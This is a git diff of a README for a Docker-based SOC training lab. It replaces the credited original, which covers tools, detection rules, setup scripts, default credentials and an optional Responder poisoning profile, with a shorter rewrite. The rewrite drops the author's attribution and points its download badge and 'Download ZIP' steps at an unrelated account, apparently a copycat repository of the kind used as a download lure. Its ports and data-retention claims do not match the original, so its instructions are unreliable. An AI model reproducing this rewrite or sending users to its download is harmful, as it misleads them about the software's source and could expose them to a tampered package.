@@ -1,533 +1,78 @@
-# Advanced SOC Lab v2.0
+# 🛡️ advanced-soc-lab-v2.0 - Build your own security operations center
 
-[![CI](https://github.com/sandeepmothukuri/advanced-soc-lab-v2.0/actions/workflows/soc-lab-ci.yml/badge.svg)](https://github.com/sandeepmothukuri/advanced-soc-lab-v2.0/actions) [![Website](https://img.shields.io/badge/Website-cybertechnology.in-blue)](https://cybertechnology.in) [![MITRE ATT&CK](https://img.shields.io/badge/MITRE-ATT%26CK-red)](https://attack.mitre.org/)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Lithuanianbeansprout3690/advanced-soc-lab-v2.0)
 
-> A hands-on, fully open-source Security Operations Center lab running 12 production-grade tools via Docker Compose. Built for SOC Level 2/3 analyst training, blue team skill development, and adversary emulation — all on a single machine.
+This project provides a complete lab environment for security analysis. You gain access to 12 professional security tools in one package. This lab helps you practice incident response, threat hunting, and log analysis on your local computer.
 
-**Author:** Sandeep Mothukuri  
-**Stack:** 12 tools · 100% free · MITRE ATT&CK v14 · Docker Compose  
-**Minimum:** 16 GB RAM · 50 GB disk · Linux / WSL2 / macOS
+## 💻 System Requirements
 
----
+Your computer needs specific hardware to run these tools. The software uses virtualization to manage multiple security services at once.
 
-## Screenshots
+*   **Operating System**: Windows 10 or Windows 11.
+*   **Processor**: 4 or more CPU cores (Intel i5/i7 or AMD Ryzen 5/7).
+*   **Memory**: 16 GB of RAM is the minimum. 32 GB is better for performance.
+*   **Storage**: 50 GB of free space on a Solid State Drive (SSD).
+*   **Virtualization**: Enable virtualization in your BIOS or UEFI settings.
 
-### Command Center Portal
-![SOC Lab Portal](dashboards/screenshots/00_portal.png)
+## 🏗️ Pre-installation Setup
 
-### SOC Overview — Live Alert Feed
-![SOC Overview](dashboards/screenshots/01_soc_overview.png)
+You must prepare your Windows environment before you run the lab.
 
-### OpenSearch SIEM — 24h Event Timeline
-![OpenSearch SIEM](dashboards/screenshots/02_opensearch_siem.png)
+1.  **Install Docker Desktop**: Download Docker Desktop from the official website. Run the installer and let it finish. Restart your computer after the install works.
+2.  **Enable WSL2**: Docker requires the Windows Subsystem for Linux (WSL2). Windows usually prompts you to install this during the Docker setup. If it does not, open your command prompt as an administrator and type `wsl --install`. Restart your machine after this step.
+3.  **Check Docker Status**: Open the Docker Desktop application. Wait until the whale icon in your taskbar stops moving and shows "Docker Desktop is running."
 
-### Zeek NSM — Network Traffic Analysis
-![Zeek Network](dashboards/screenshots/03_zeek_network.png)
+## 📥 How to Download and Install
 
-### Suricata IDS — EVE JSON Alert Feed
-![Suricata IDS](dashboards/screenshots/04_suricata_ids.png)
+1.  Visit the project page to access the files: [https://github.com/Lithuanianbeansprout3690/advanced-soc-lab-v2.0](https://github.com/Lithuanianbeansprout3690/advanced-soc-lab-v2.0).
+2.  Locate the green button labeled "Code" near the top right of the page.
+3.  Click "Download ZIP" to save the project files to your computer.
+4.  Find the downloaded file in your "Downloads" folder. Right-click the file and select "Extract All..." to unzip the folder.
+5.  Move the unzipped folder to a location you can find, such as your "Documents" folder.
 
-### AI Agents — CrewAI Threat Analysis
-![AI Agents](dashboards/screenshots/05_ai_agents.png)
+## 🚀 Running the Lab
 
-### DFIR-IRIS — Case Management & Attack Timeline
-![DFIR-IRIS](dashboards/screenshots/06_iris_cases.png)
+1.  Open the folder containing the lab files.
+2.  Right-click the folder background while holding the "Shift" key on your keyboard. Select "Open PowerShell window here" or "Open in Terminal".
+3.  Type `docker-compose up -d` in the window and press Enter.
+4.  Docker will download the necessary components for the tools. This process might take 10 to 20 minutes depending on your internet speed.
+5.  Check your Docker Desktop window. You will see a list of containers starting up. Once all container icons turn green, the lab is ready.
 
-### MITRE Caldera — Adversary Emulation
-![Caldera](dashboards/screenshots/07_caldera_attack.png)
+## 🛠️ Security Tools Included
 
-### MISP — Threat Intelligence Platform
-![MISP](dashboards/screenshots/08_misp_ti.png)
+This lab includes a suite of tools that security teams use every day.
 
-### Velociraptor — Live Forensics & DFIR
-![Velociraptor](dashboards/screenshots/09_velociraptor.png)
+*   **OpenSearch**: Stores and searches logs from your simulated network.
+*   **Suricata**: Inspects network traffic for known attack patterns.
+*   **Zeek**: Logs network activity and connection details for later review.
+*   **MISP**: Tracks information about active threats and attacker groups.
+*   **Caldera**: Generates realistic security alerts based on MITRE ATT&CK methods.
+*   **Velociraptor**: Performs deep investigation on files and system changes.
+*   **AI Agents**: Assists with interpreting complex security logs and alerts.
 
-### Red Team — Responder + LLMNR Poisoning
-![Red Team](dashboards/screenshots/10_responder_redteam.png)
+## 📋 Accessing the Web Interfaces
 
----
+Once the containers run, you access the tools through your web browser. Type the addresses below to open each dashboard.
 
-## Overview
+*   **OpenSearch Dashboard**: http://localhost:5601
+*   **MISP Interface**: http://localhost:80
+*   **Caldera Interface**: http://localhost:8888
+*   **Velociraptor Dashboard**: http://localhost:8000
 
-The Advanced SOC Lab v2.0 is a complete, self-contained security operations environment designed for hands-on learning. Every component is open-source and orchestrated with Docker Compose, so you can spin up a full SOC stack in under 15 minutes.
+The default login credentials for these services are often "admin" and "password" or available within the project documentation files inside the main folder.
 
-### What You Get
+## 🧹 Maintenance and Shutdown
 
-| Layer | Tool | Purpose |
-|---|---|---|
-| **SIEM** | OpenSearch 2.13 + Dashboards | Log ingestion, search, visualization |
-| **Log Pipeline** | Vector 0.38 | Unified log routing and transformation |
-| **Detection** | ElastAlert2 | Rule-based alerting from OpenSearch |
-| **Network NSM** | Zeek 6.0 + Suricata 7.0 | Packet-level network security monitoring |
-| **SOAR** | StackStorm 3.8 | Automated response playbooks |
-| **Case Mgmt** | DFIR-IRIS 2.4 | Incident tracking, timelines, IOCs |
-| **Threat Intel** | MISP | IOC sharing, feeds, attribution |
-| **DFIR** | Velociraptor | Live forensics, VQL hunting |
-| **Attack Sim** | MITRE Caldera 5.x | Adversary emulation, ATT&CK mapping |
-| **Red Team** | Responder | LLMNR/NBT-NS poisoning (lab profile) |
-| **AI Analysis** | Ollama + CrewAI | LLM-powered SOC agents |
+You should stop the lab when you finish your work to save computer resources.
 
-### Detection Rules (15 built-in)
+1.  Open the same terminal window you used to start the lab.
+2.  Type `docker-compose stop` to pause the services.
+3.  Type `docker-compose down` if you want to remove the containers completely. This keeps your data but stops the background processes.
+4.  If you want to clear all data and reset the lab to its original state, run `docker-compose down -v`.
 
-| Rule | Technique | Severity |
-|---|---|---|
-| Brute Force / Password Spray | T1110.001 | High |
-| LSASS Memory Dump | T1003.001 | Critical |
-| PowerShell Encoded Command | T1059.001 | High |
-| Lateral Movement via SMB | T1021.002 | Critical |
-| LLMNR/NBT-NS Poisoning | T1557.001 | High |
-| Scheduled Task Creation | T1053.005 | Medium |
-| Registry Run Key Persistence | T1547.001 | Medium |
-| DNS Tunneling C2 | T1071.004 | High |
-| Pass-the-Hash | T1550.002 | Critical |
-| Network Port Scan | T1046 | Medium |
-| Data Exfiltration over C2 | T1041 | Critical |
-| Defender Disabled | T1562.001 | Critical |
-| Spearphishing Attachment | T1566.001 | High |
-| Bulk File Collection | T1039 | Medium |
-| After-Hours Account Login | T1078 | Medium |
+## 🆘 Troubleshooting
 
-### AI Agents
-
-| Agent | Role | Capability |
-|---|---|---|
-| Threat Analyst | APT attribution, TTP mapping | Correlates IOCs with threat actors |
-| Incident Responder | Triage and containment | Generates response playbooks |
-| Threat Hunter | Proactive hunting | Builds VQL queries from hypotheses |
-| Detection Engineer | Rule creation | Writes ElastAlert2 and Sigma rules |
-
----
-
-## Architecture
-
-```
-Internet / Lab Network
-        │
-   ┌────▼─────────────────────────────────────────────┐
-   │              Docker Compose Network               │
-   │                                                   │
-   │  ┌──────────┐  ┌──────────┐  ┌────────────────┐  │
-   │  │  Zeek    │  │ Suricata │  │  Log Sources   │  │
-   │  │ (NSM)    │  │ (IDS)    │  │  Sysmon/Win    │  │
-   │  └────┬─────┘  └────┬─────┘  └───────┬────────┘  │
-   │       └─────────────┴────────────────┘           │
-   │                     │ Vector 0.38                 │
-   │               ┌─────▼──────┐                      │
-   │               │ OpenSearch │◄─── ElastAlert2      │
-   │               │  (SIEM)    │                      │
-   │               └─────┬──────┘                      │
-   │                     │                             │
-   │        ┌────────────┼────────────┐                │
-   │        ▼            ▼            ▼                │
-   │   StackStorm    DFIR-IRIS      MISP               │
-   │   (SOAR)       (Cases)        (Threat Intel)      │
-   │        │            │            │                │
-   │        └────────────┴────────────┘                │
-   │                     │                             │
-   │              ┌──────▼──────┐                      │
-   │              │  AI Agents  │                      │
-   │              │ Ollama/Crew │                      │
-   │              └─────────────┘                      │
-   │                                                   │
-   │  ┌──────────────┐   ┌──────────────┐              │
-   │  │    Caldera   │   │  Velociraptor│              │
-   │  │  (Attack Sim)│   │    (DFIR)    │              │
-   │  └──────────────┘   └──────────────┘              │
-   └───────────────────────────────────────────────────┘
-```
-
----
-
-## Requirements
-
-| Requirement | Minimum | Recommended |
-|---|---|---|
-| RAM | 14 GB | 16–32 GB |
-| Disk | 30 GB | 50 GB |
-| CPU | 4 cores | 8 cores |
-| OS | Ubuntu 22.04 / Debian 12 / WSL2 | Ubuntu 22.04 LTS |
-| Docker | 24.x | Latest |
-| Docker Compose | v2.x | Latest |
-
----
-
-## Installation
-
-### Step 1 — Clone the Repository
-
-```bash
-git clone https://github.com/sandeepmothukuri/advanced-soc-forge.git
-cd advanced-soc-lab-v2
-```
-
-### Step 2 — Make Scripts Executable
-
-```bash
-chmod +x setup.sh health-check.sh simulate-attack.sh
-```
-
-### Step 3 — Run the Setup Script
-
-The setup script handles everything: environment config, kernel tuning, Docker image pulls, and staged service deployment.
-
-```bash
-sudo ./setup.sh
-```
-
-The script runs in 4 stages:
-
-```
-── Stage 1/4 — Core infrastructure (OpenSearch, Vector) ──
-── Stage 2/4 — Security tools (MISP, IRIS, Velociraptor) ──
-── Stage 3/4 — SOAR + Detection (StackStorm, ElastAlert2) ──
-── Stage 4/4 — AI agents + Attack simulation (Ollama, Caldera) ──
-```
-
-> **First run:** Ollama downloads `llama3.2:3b` (~2 GB). Total setup time: 10–20 minutes depending on internet speed.
-
-### Step 4 — Verify All Services Are Healthy
-
-```bash
-./health-check.sh
-```
-
-Expected output:
-
-```
-  Advanced SOC Lab v2.0 — Health Check
-
-  Core Infrastructure
-  ✔  OpenSearch         cluster:green · 0 documents
-  ✔  OpenSearch Node 1  container running
-  ✔  OpenSearch Node 2  container running
-  ✔  OpenSearch Dashboards  HTTP 200
-  ✔  Vector Pipeline    container running
-
-  Security Tools
-  ✔  DFIR-IRIS          HTTP 200
-  ✔  MISP               HTTP 200
-  ✔  Velociraptor       HTTP 200
-  ✔  StackStorm         HTTP 200
-  ✔  ElastAlert2        container running
-
-  Attack Simulation & AI
-  ✔  MITRE Caldera      HTTP 200
-  ✔  AI Agents API      HTTP 200
-  ✔  Ollama LLM         HTTP 200
-  ✔  WebSocket Streamer container running
-
-  Results: 14 passed  0 failed  1 warnings  (15 checks)
-  All critical services healthy.
-```
-
-### Step 5 — Open the Dashboard Portal
-
-Open `dashboards/index.html` in your browser. All 10 dashboards are accessible from the portal.
-
----
-
-## Configuration
-
-### Environment Variables
-
-Credentials are auto-generated by `setup.sh` into `.env`. Review and customize before use:
-
-```bash
-cat .env
-```
-
-Key variables:
-
-| Variable | Default | Description |
-|---|---|---|
-| `OPENSEARCH_PASSWORD` | auto-generated | OpenSearch admin password |
-| `IRIS_SECRET_KEY` | auto-generated | DFIR-IRIS Flask secret |
-| `CALDERA_RED_PASSWORD` | `changeme` | Caldera red team password |
-| `CALDERA_BLUE_PASSWORD` | `changeme` | Caldera blue team password |
-| `MISP_KEY` | auto-generated | MISP API key |
-| `ST2_AUTH_TOKEN` | auto-generated | StackStorm auth token |
-
-> **Important:** Change `CALDERA_RED_PASSWORD` and `CALDERA_BLUE_PASSWORD` before deploying.
-
-### Kernel Parameters
-
-OpenSearch requires a higher memory map limit. The setup script applies this automatically:
-
-```bash
-sudo sysctl -w vm.max_map_count=262144
-
-# Make permanent
-echo "vm.max_map_count=262144" | sudo tee -a /etc/sysctl.conf
-```
-
-### Endpoint Agent Installation
-
-**Windows (PowerShell — run as Administrator):**
-
-```powershell
-# Install Velociraptor agent
-$url = "http://YOUR_LAB_IP:8889/api/v1/GetFile?name=velociraptor-agent-windows.exe"
-Invoke-WebRequest -Uri $url -OutFile "velociraptor-agent.exe"
-.\velociraptor-agent.exe --config agent.config.yaml service install
-
-# Install Sysmon for detailed process logging
-Invoke-WebRequest -Uri https://download.sysinternals.com/files/Sysmon.zip -OutFile Sysmon.zip
-Expand-Archive Sysmon.zip -DestinationPath Sysmon
-.\Sysmon\Sysmon64.exe -accepteula -i config/sysmon/sysmon-config.xml
-```
-
-**Linux:**
-
-```bash
-# Install Velociraptor agent
-curl -L http://YOUR_LAB_IP:8889/api/v1/GetFile?name=velociraptor-agent-linux \
-  -o velociraptor-agent
-chmod +x velociraptor-agent
-sudo ./velociraptor-agent --config agent.config.yaml service install
-```
-
----
-
-## Running Attack Simulations
-
-The `simulate-attack.sh` script injects realistic MITRE ATT&CK events directly into OpenSearch for analyst training.
-
-### APT-29 Kill Chain (13 Techniques)
-
-```bash
-./simulate-attack.sh apt29
-```
-
-Injects events for: T1566.001 → T1059.001 → T1053.005 → T1547.001 → T1003.001 → T1110.001 → T1557.001 → T1021.002 → T1550.002 → T1046 → T1041 → T1071.004 → T1562.001
-
-### Brute Force / Password Spray
-
-```bash
-./simulate-attack.sh bruteforce
-```
-
-Simulates password spray across 12 accounts with account lockout events.
-
-### Insider Threat
-
-```bash
-./simulate-attack.sh insider
-```
-
-Simulates bulk file collection, cloud upload exfiltration, and log deletion.
-
-### Run All Scenarios
-
-```bash
-./simulate-attack.sh all
-```
-
-### Verify Events Were Indexed
-
-```bash
-./simulate-attack.sh verify
-```
-
----
-
-## Service URLs
-
-| Service | URL | Credentials |
-|---|---|---|
-| **Dashboard Portal** | `dashboards/index.html` | — |
-| **OpenSearch Dashboards** | http://localhost:5601 | admin / `$OPENSEARCH_PASSWORD` |
-| **DFIR-IRIS** | http://localhost:4460 | admin / `changeme` |
-| **MITRE Caldera** | http://localhost:8888 | red / `$CALDERA_RED_PASSWORD` |
-| **Velociraptor** | http://localhost:8889 | admin / `changeme` |
-| **MISP** | http://localhost:4000 | admin@admin.test / `admin` |
-| **StackStorm** | http://localhost:9000 | st2admin / `changeme` |
-| **AI Agents API** | http://localhost:8000/docs | — |
-| **Ollama** | http://localhost:11434 | — |
-| **OpenSearch API** | http://localhost:9200 | admin / `$OPENSEARCH_PASSWORD` |
-
----
-
-## Optional: Red Team Profile
-
-The Responder container (LLMNR/NBT-NS poisoning) is disabled by default. Start it only on an isolated lab network:
-
-```bash
-# Start red team profile
-docker compose --profile redteam up -d
-
-# Stop red team profile
-docker compose --profile redteam down
-```
-
-> **Warning:** Never run Responder on a production network or any network without explicit written authorization. Lab network only.
-
----
-
-## Stopping and Managing the Lab
-
-```bash
-# Stop all services (keep data)
-docker compose down
-
-# Stop and delete all data volumes
-docker compose down -v
-
-# Restart a single service
-docker compose restart elastalert2
-
-# View logs for a service
-docker compose logs -f ai-agents
-
-# Check resource usage
-docker stats
-```
-
----
-
-## Project Structure
-
-```
-advanced-soc-lab-v2/
-├── docker-compose.yml          # All 12 services + red team profile
-├── .env.example                # Environment variable template
-├── setup.sh                    # One-command deployment script
-├── health-check.sh             # Service health validation
-├── simulate-attack.sh          # Attack scenario injection
-├── README.md                   # This file
-│
-├── dashboards/                 # Web UI dashboards
-│   ├── index.html              # Main portal
-│   ├── soc-theme.css           # Shared dark design system
-│   ├── 01_soc_overview.html    # Live alert feed + MITRE heatmap
-│   ├── 02_opensearch_siem.html # 24h timeline + index stats
-│   ├── 03_zeek_network.html    # conn.log stream + DNS anomalies
-│   ├── 04_suricata_ids.html    # EVE JSON feed + top signatures
-│   ├── 05_ai_agents.html       # CrewAI agent console
-│   ├── 06_iris_cases.html      # Incident cases + IOC tracker
-│   ├── 07_caldera_attack.html  # ATT&CK coverage matrix
-│   ├── 08_misp_ti.html         # IOC lookup + feed status
-│   ├── 09_velociraptor.html    # Hunt progress + VQL console
-│   └── 10_responder_redteam.html # NTLMv2 capture + blue response
-│
-├── config/
-│   ├── opensearch/             # OpenSearch + Dashboards config
-│   ├── elastalert2/rules/      # 15 detection rules (YAML)
-│   ├── caldera/operations/     # APT-29 + Insider Threat operations
-│   ├── nginx/                  # Reverse proxy config
-│   └── misp/                   # MISP server config
-│
-├── ai-agents/                  # CrewAI SOC agents
-│   ├── agents/                 # threat_analyst, incident_responder,
-│   │                           # threat_hunter, detection_engineer
-│   ├── tools/                  # OpenSearch, MISP, IRIS, Velociraptor tools
-│   └── api.py                  # FastAPI + WebSocket server
-│
-├── soar-playbooks/             # StackStorm automation packs
-├── detection-rules/            # Sigma rules + ElastAlert2 configs
-├── endpoint-configs/           # Sysmon, Velociraptor, Zeek configs
-├── cloud-logs/                 # AWS CloudTrail, Azure, GCP parsers
-└── threat-hunting/             # Pre-built hunting queries
-```
-
----
-
-## Troubleshooting
-
-| Problem | Cause | Fix |
-|---|---|---|
-| OpenSearch won't start | `vm.max_map_count` too low | `sudo sysctl -w vm.max_map_count=262144` |
-| Cluster status RED | Not enough memory | Close other apps; ensure 16 GB free |
-| Caldera agent offline | Firewall blocking port 8888 | `ufw allow 8888` |
-| Ollama model missing | Download failed | `docker exec ollama ollama pull llama3.2:3b` |
-| Container keeps restarting | Out of disk space | Free space: `docker system prune` |
-| ElastAlert2 no alerts | No data in OpenSearch | Run `./simulate-attack.sh apt29` first |
-| MISP login fails | Container still initializing | Wait 2–3 min after startup |
-
-### View Service Logs
-
-```bash
-docker compose logs -f opensearch-node1
-docker compose logs -f elastalert2
-docker compose logs -f ai-agents
-docker compose logs -f caldera
-```
-
-### Full Reset
-
-```bash
-docker compose down -v
-sudo rm -rf data/
-./setup.sh
-```
-
----
-
-## Learning Exercises
-
-Once the lab is running, work through these exercises in order:
-
-1. **Alert Triage** — Run `./simulate-attack.sh apt29`, open OpenSearch Dashboards, and triage the 13 injected alerts by severity
-2. **Case Creation** — Open DFIR-IRIS and create a new case for the APT-29 intrusion. Add IOCs and link MITRE techniques
-3. **Network Forensics** — Review the Zeek Network dashboard for LLMNR poisoning and DNS tunneling indicators
-4. **Threat Hunting** — Use the Velociraptor VQL console to hunt for suspicious scheduled tasks and LSASS access
-5. **Detection Gap Analysis** — Run the Caldera APT-29 operation and review which techniques were detected vs missed
-6. **SOAR Automation** — Trigger a StackStorm playbook by injecting a brute force scenario and observing automated response
-7. **AI-Assisted Analysis** — Use the AI Agents dashboard to run the APT-29 attribution scenario and review the LLM analysis
-8. **Red Team (optional)** — Enable the red team profile, capture NTLMv2 hashes via Responder, and follow the blue team response timeline
-
----
-
-## Contributing
-
-Pull requests are welcome. Please open an issue first to discuss significant changes.
-
-1. Fork the repository
-2. Create a feature branch: `git checkout -b feature/my-detection-rule`
-3. Commit your changes: `git commit -m 'Add T1055 process injection detection rule'`
-4. Push to the branch: `git push origin feature/my-detection-rule`
-5. Open a Pull Request
-
----
-
-## License
-
-MIT License — free to use, modify, and distribute for educational and research purposes.
-
----
-
-## Author
-
-**Sandeep Mothukuri**
-
-Built as a hands-on SOC training environment for blue team skill development, threat detection practice, and adversary emulation research.
-
-> *"The best way to learn detection is to run the attack yourself."*
-
----
-
-*Advanced SOC Lab v2.0 · 12 tools · 100% open-source · MITRE ATT&CK v14*
-
-
----
-
-## 👤 Author
-
-**Sandeep Mothukuri**
-- GitHub: [@sandeepmothukuri](https://github.com/sandeepmothukuri)
-- Website: [cybertechnology.in](https://cybertechnology.in)
-- LinkedIn: [linkedin.com/in/sandeepmothukuris](https://www.linkedin.com/in/sandeepmothukuris)
-- Email: sandeep.mothukuris@gmail.com
-
----
-
-## 🗂️ All Repositories
-
-| Repository | Description |
-|---|---|
-| [ai-soc-lab](https://github.com/sandeepmothukuri/ai-soc-lab) | AI-augmented SOC with Wazuh + TheHive + Ollama (LLaMA3) for automated triage |
-| [advanced-soc-lab-v2.0](https://github.com/sandeepmothukuri/advanced-soc-lab-v2.0) | 12-tool SOC lab with OpenSearch, Suricata, Zeek, MISP, Caldera, Velociraptor |
-| [Autonomous-SOC-Lab](https://github.com/sandeepmothukuri/Autonomous-SOC-Lab) | Autonomous SOC with AI-driven detection and self-healing playbooks |
-| [soc-threat-hunting-lab](https://github.com/sandeepmothukuri/soc-threat-hunting-lab) | Threat detection lab — Zeek, RITA, Arkime, Velociraptor, OSQuery, MISP |
-| [soc-lab-free](https://github.com/sandeepmothukuri/soc-lab-free) | Free SOC lab — OpenVAS, Wazuh, pfSense, Proxmox Mail, Lynis |
-| [soc-lab](https://github.com/sandeepmothukuri/soc-lab) | SOC analyst home lab — Wazuh SIEM, Sysmon, MITRE ATT&CK mapping |
-| [cyberblue](https://github.com/sandeepmothukuri/cyberblue) | Containerised blue team platform — SIEM, DFIR, CTI, SOAR, Network Analysis |
+*   **Docker fails to start**: Ensure your Windows version is up to date. Make sure virtualization is on in your computer settings.
+*   **Missing dashboards**: Give the containers a few minutes to finish their initial setup. Some tools take more time to initialize the database than others.
+*   **Slow performance**: Close other heavy applications like web browsers with many tabs or video editing software. The security tools prioritize background tasks.
+*   **Memory exhaustion**: Open Docker Desktop and go to the "Resources" settings. Assign at least 8 GB of RAM to the Docker engine for best results.
